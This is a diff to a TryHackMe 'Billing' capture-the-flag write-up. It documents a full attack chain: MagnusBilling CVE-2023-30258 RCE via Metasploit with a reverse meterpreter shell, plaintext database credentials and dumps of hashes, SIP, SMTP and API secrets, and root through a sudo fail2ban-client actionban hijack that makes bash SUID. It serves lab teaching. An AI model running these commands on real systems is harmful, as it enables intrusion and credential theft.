@@ -1,11 +1,10 @@
 # Billing - TryHackMe Writeup
 
-**Status:** 🚧 _Work in progress — recon captured, exploitation & privesc pending._
-
-**Target:** `TARGET_IP` (10.128.187.240 at time of solve)
+**Target:** `TARGET_IP` (10.130.173.152 at time of solve)
 **OS:** Linux (Debian)
 **Difficulty:** Easy
-**Tech stack:** Apache 2.4.62, `/mbilling` (MagnusBilling), MySQL, Asterisk Manager
+**Tech stack:** Apache 2.4.62, `/mbilling` (MagnusBilling), MariaDB, Asterisk Manager
+**Exploit chain:** MagnusBilling CVE-2023-30258 → DB-config creds → `sudo fail2ban-client` abuse → SUID `bash` root
 
 ---
 
@@ -14,13 +13,23 @@
 ```
 nmap → 22/tcp SSH, 80/tcp Apache, 3306/tcp MySQL, 5038/tcp Asterisk AMI
     ↓
-whatweb → redirects to /mbilling (MagnusBilling VoIP billing app)
+whatweb → Apache redirects to /mbilling/  (MagnusBilling fingerprint)
     ↓
-feroxbuster on /mbilling/ → [content enumeration in progress]
+Metasploit — exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
     ↓
-[WIP] exploitation path (MagnusBilling / Asterisk AMI)
+meterpreter as `asterisk`
     ↓
-[WIP] user → root
+grep /etc/asterisk/ → res_config_mysql.conf leaks mbillingUser:BLOGYwvtJkI7uaX5
+    ↓
+mysqldump mbilling → pkg_user SHA-1 (uncrackable in rockyou) + SMTP / SIP / API creds
+    ↓
+sudo -l → NOPASSWD /usr/bin/fail2ban-client
+    ↓
+fail2ban-client set sshd action ... actionban "chmod +s /bin/bash" + banip <x>
+    ↓
+bash -p → root
+    ↓
+cat /root/root.txt
 ```
 
 ---
@@ -28,29 +37,32 @@ feroxbuster on /mbilling/ → [content enumeration in progress]
 ## Table of Contents
 1. [Reconnaissance](#1-reconnaissance)
 2. [Web Triage](#2-web-triage)
-3. [Initial Access (WIP)](#3-initial-access-wip)
+3. [Initial Access — MagnusBilling CVE-2023-30258](#3-initial-access--magnusbilling-cve-2023-30258)
+4. [Post-Exploitation Enumeration (`asterisk`)](#4-post-exploitation-enumeration-asterisk)
+5. [Database Looting](#5-database-looting)
+6. [Privilege Escalation — `sudo fail2ban-client` → root](#6-privilege-escalation--sudo-fail2ban-client--root)
+7. [Root Flag](#7-root-flag)
+8. [Key Takeaways](#8-key-takeaways)
 
 ---
 
 ## 1. Reconnaissance
 
-Full TCP sweep then service detection on the open ports:
+Full TCP sweep, then service detection on the open ports:
 
 ```bash
 nmap -sS -p- -n -Pn $TARGET
 nmap -sVC -p22,80,3306,5038 $TARGET -oA service
 ```
 
-Results:
-
 | Port | Service | Notes |
 |------|---------|-------|
 | 22/tcp | OpenSSH | Linux login |
 | 80/tcp | Apache 2.4.62 (Debian) | Redirects to `/mbilling` |
-| 3306/tcp | MySQL | External DB — usually not reachable on THM |
-| 5038/tcp | Asterisk Call Manager (AMI) | Management socket for PBX |
+| 3306/tcp | MariaDB / MySQL | Bound to localhost from the outside |
+| 5038/tcp | Asterisk Call Manager (AMI) | PBX management socket |
 
-The `5038` + `/mbilling` combo is the fingerprint of **MagnusBilling** — an Asterisk-based VoIP billing frontend with a history of unauthenticated RCE (e.g. CVE-2023-30258 on the `icepay` endpoint).
+**Signal:** port `5038` + HTTP → MagnusBilling (Asterisk-based VoIP billing frontend). That product has a well-known unauth RCE — CVE-2023-30258 — in the `icepay` module.
 
 ---
 
@@ -58,39 +70,201 @@ The `5038` + `/mbilling` combo is the fingerprint of **MagnusBilling** — an As
 
 ```bash
 whatweb http://$TARGET/
-# → Apache[2.4.62], HTTPServer[Debian Linux], RedirectLocation[./mbilling]
+# Apache[2.4.62], HTTPServer[Debian Linux], RedirectLocation[./mbilling]
 ```
 
-Confirms the landing page redirects to `/mbilling/`. Everything interesting lives inside that path.
+Browser hits `/mbilling/` → the MagnusBilling login page. No credentials needed; the RCE is pre-auth.
 
-Directory brute on the app root:
+Directory brute just to confirm the app layout (optional):
 
 ```bash
 feroxbuster -u http://$TARGET/mbilling/ \
   -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 ```
 
-_(WIP — output pending)_
+---
+
+## 3. Initial Access — MagnusBilling CVE-2023-30258
+
+Metasploit ships the exploit module. Full playbook in [magnusbilling-rce.md](../../exploits/magnusbilling-rce.md).
+
+```bash
+msfconsole
+search magnusbilling
+use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
+set RHOSTS $TARGET
+set TARGETURI /mbilling/
+set LHOST tun0
+run
+```
+
+Drops a **meterpreter as `asterisk`**. Stabilise the shell immediately:
+
+```bash
+shell
+bash -i
+export TERM=xterm-256color
+whoami          # asterisk
+id
+uname -a
+```
 
 ---
 
-## 3. Initial Access (WIP)
+## 4. Post-Exploitation Enumeration (`asterisk`)
 
-Exploitation not yet captured. Candidate paths for this target class:
+First pass of the [Linux enumeration playbook](../../exploits/linux-enumeration.md) — system context + `sudo -l` + credential hunt.
 
-- **MagnusBilling CVE-2023-30258** — unauth command injection in `/mbilling/index.php?module=icepay`.
-- **Asterisk AMI (port 5038)** default creds / weak creds → originate calls, read/write files via `MixMonitor`.
-- **MySQL (port 3306)** external — usually filtered on THM.
+### System context & sudo
+```bash
+id
+uname -a
+sudo -l
+# User asterisk may run the following commands on HOST:
+#     (root) NOPASSWD: /usr/bin/fail2ban-client
+# Defaults!/usr/bin/fail2ban-client !requiretty
+```
 
-See [windows-enumeration.md](../../exploits/windows-enumeration.md) if needed for any foothold pivot; for Linux post-ex see [linux-enumeration.md](../../exploits/linux-enumeration.md).
+`fail2ban-client` NOPASSWD is the privesc lever — parked for step 6.
+
+### Credential hunt on disk
+
+```bash
+# Any file referencing MySQL connection helpers
+find / -type f -exec grep -l -i "mysql_connect\|mysqli_connect\|PDO\|DB_PASSWORD\|MYSQL_PASSWORD" {} \; 2>/dev/null
+
+# Config files with cleartext passwords
+find / -type f \( -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.cnf" \) \
+  -exec grep -l -i "password\|passwd\|pwd" {} \; 2>/dev/null
+
+# Narrow pass over web roots
+find /var/www/html /home/*/public_html /opt/lampp/htdocs -type f \
+  \( -name "*.php" -o -name "*.inc" -o -name "config*.php" \) \
+  -exec grep -H -i "mysql\|password\|db_user" {} \; 2>/dev/null
+```
+
+The high-signal hit:
+
+```
+/etc/asterisk/res_config_mysql.conf
+```
+
+```bash
+cat /etc/asterisk/res_config_mysql.conf
+# dbhost = localhost
+# dbname = mbilling
+# dbuser = mbillingUser
+# dbpass = BLOGYwvtJkI7uaX5
+```
+
+### User flag
+The user flag lives at `/home/asterisk/user.txt`.
+
+---
+
+## 5. Database Looting
+
+Remote MySQL is filtered (confirmed by `mysql -h $TARGET -u mbillingUser --password=...`), so everything goes through the local client in the meterpreter session. Tool note: [mysql.md](../../tools/mysql.md).
+
+### Full dump
+```bash
+mysqldump -u mbillingUser -p'BLOGYwvtJkI7uaX5' mbilling > /tmp/mbilling_backup.sql
+```
+
+### Target the interesting tables
+```bash
+# Admin / operator accounts (SHA-1 hashes)
+mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -D mbilling -e "SELECT * FROM pkg_user;" > /tmp/usuarios.txt
+
+# Remote Asterisk servers
+mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e "SELECT * FROM mbilling.pkg_servers;"
+
+# SIP extensions with per-extension secrets
+mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e \
+  "SELECT id, name, secret, host, context FROM mbilling.pkg_sip LIMIT 20;"
+
+# IAX trunks
+mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e "SELECT * FROM mbilling.pkg_iax LIMIT 10;"
+
+# SMTP creds (often reused)
+mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e "SELECT * FROM mbilling.pkg_smtp;"
+# → mail.magnusbilling.com  billing@magnusbilling.com  magnus  587
+
+# REST API keys
+mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e "SELECT * FROM mbilling.pkg_api;"
+```
+
+### Admin hash found
+```
+root : d8c55b020bca07272d4cf3a46d693bb6ebafe3e1
+```
+
+Raw SHA-1 → hashcat mode 100:
+
+```bash
+hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+Not in rockyou. Not worth deeper cracking — the privesc lever is already in `sudo -l`.
+
+Loot transfer from meterpreter:
+```
+meterpreter > download /tmp/usuarios.txt
+meterpreter > download /tmp/mbilling_backup.sql
+```
+
+---
+
+## 6. Privilege Escalation — `sudo fail2ban-client` → root
+
+Full technique note: [fail2ban-sudo-privesc.md](../../exploits/fail2ban-sudo-privesc.md).
+
+`fail2ban-server` runs as root. `fail2ban-client` (sudo-allowed here) can overwrite the `actionban` shell snippet of an existing jail. Any later ban triggers the snippet **as root**.
+
+```bash
+# 1. Hijack the sshd jail's ban action
+sudo /usr/bin/fail2ban-client set sshd action iptables-multiport \
+  actionban "chmod +s /bin/bash"
+
+# 2. Force a ban to fire our action
+sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.4
+
+# 3. Verify bash is now SUID root
+ls -la /bin/bash
+# -rwsr-xr-x 1 root root ... /bin/bash
+
+# 4. Get a privileged shell
+bash -p
+whoami          # root
+id
+```
+
+---
+
+## 7. Root Flag
+
+```bash
+cat /root/root.txt
+cat /root/passwordMysql.log     # dropped during setup, another loot file
+```
+
+---
+
+## 8. Key Takeaways
+
+- `/mbilling/` + port 5038 is the MagnusBilling fingerprint — CVE-2023-30258 before anything else.
+- Asterisk boxes keep DB creds in plaintext at `/etc/asterisk/res_config_mysql.conf`. Always grep `/etc/` after landing as `asterisk`.
+- MagnusBilling's `pkg_user.password` is raw SHA-1 — attempt `hashcat -m 100` but don't sink hours into it; the privesc lever is usually elsewhere.
+- `fail2ban-client` under sudo is a wildcard-command primitive. Treat any `fail2ban-client` entry in `sudo -l` as instant root.
+- `bash -p` is what preserves the SUID-root EUID — `bash` alone resets it.
 
 ---
 
 ## Related Notes
-- [nmap](../../tools/nmap.md) — port & service discovery
-- [whatweb](../../tools/whatweb.md) — HTTP fingerprinting
-- [feroxbuster](../../tools/feroxbuster.md) — recursive directory brute
-
----
-
-_Writeup to be extended once user + root flags are captured._
+- [magnusbilling-rce.md](../../exploits/magnusbilling-rce.md) — exploit playbook
+- [fail2ban-sudo-privesc.md](../../exploits/fail2ban-sudo-privesc.md) — privesc playbook
+- [mysql](../../tools/mysql.md) — DB enumeration tool note
+- [metasploit](../../tools/metasploit.md) — public-exploit delivery
+- [hashcat](../../tools/hashcat.md) — SHA-1 mode 100
+- [linux-enumeration.md](../../exploits/linux-enumeration.md) — post-foothold checklist
+- [nmap](../../tools/nmap.md), [whatweb](../../tools/whatweb.md), [feroxbuster](../../tools/feroxbuster.md) — recon
